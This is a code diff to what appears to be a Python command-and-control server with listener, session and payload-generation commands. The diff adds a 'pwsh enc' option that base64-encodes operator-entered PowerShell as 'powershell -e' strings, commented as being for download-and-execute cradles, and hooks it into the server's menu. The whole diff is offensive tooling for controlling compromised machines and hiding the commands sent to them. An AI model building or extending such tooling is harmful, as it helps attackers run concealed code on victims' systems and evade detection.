@@ -3,6 +3,7 @@ import threading
 from prettytable import PrettyTable
 import time
 from datetime import datetime
+import base64
 import random
 import string
 import os
@@ -257,6 +258,17 @@ def generate_payload():
         f'Python payload for command server {host_ip}:{host_port} saved as {file_name} in current directory.')
 
 
+# Create an encrypted powershell command from user input - used for download and execute cradles
+def pwsh_enc():
+    cradle = input('[*] Enter the powershell command to be encoded: ')
+    cradle_unencoded = cradle.encode('utf-16le')
+    cradle_encoded = base64.b64encode(cradle_unencoded)
+    cradle_encoded = cradle_encoded.decode()
+    print(f'\n[!] Econded command:\npowershell -e {cradle_encoded}')
+    cradle_decoded = base64.b64decode(cradle_encoded).decode()
+    print(f'\n[*] Decoded command:\npowershell {cradle_decoded}')
+
+
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     banner()
@@ -266,9 +278,11 @@ if __name__ == '__main__':
     while True:
         try:
             command = input('Enter command#> ')
+
             if command == 'start listener':
                 listener_handler()
                 listener_counter += 1
+
             if command.split(' ')[0] == 'sessions':
                 session_counter = 1
                 if command.split(' ')[1] == '-l':
@@ -291,6 +305,10 @@ if __name__ == '__main__':
                             print(f'[-] Session {num} is dead.')
                     except IndexError:
                         print(f'[-] Session {num} does not exist.')
+
+            if command == 'pwsh enc':
+                pwsh_enc()
+
             if command == 'exit':
                 should_close_socket = True
                 sock.close()
